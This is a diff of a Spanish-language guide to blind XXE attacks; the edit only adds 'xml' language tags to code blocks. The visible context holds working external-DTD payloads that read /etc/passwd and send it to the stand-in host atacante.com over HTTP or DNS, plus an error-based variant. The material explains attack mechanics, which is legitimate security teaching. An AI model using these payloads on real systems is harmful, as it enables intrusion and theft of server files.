@@ -78,7 +78,7 @@ Dos archivos. El documento declara una entidad de parámetro que trae la DTD del
 
 Y `e.dtd`, servida por el atacante, trae la maquinaria:
 
-```
+```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://atacante.com/?x=%file;'>">
 %eval;
@@ -92,7 +92,7 @@ Y `e.dtd`, servida por el atacante, trae la maquinaria:
 
 Si solo sale DNS:
 
-```
+```xml
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.atacante.com/'>">
 ```
 
@@ -102,7 +102,7 @@ Límite de 63 caracteres por etiqueta: hay que trocear, y el base64 con `=` y `/
 
 Mismo mecanismo, ruta local inexistente en lugar de URL. En `e.dtd`:
 
-```
+```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///noexiste/%file;'>">
 %eval;
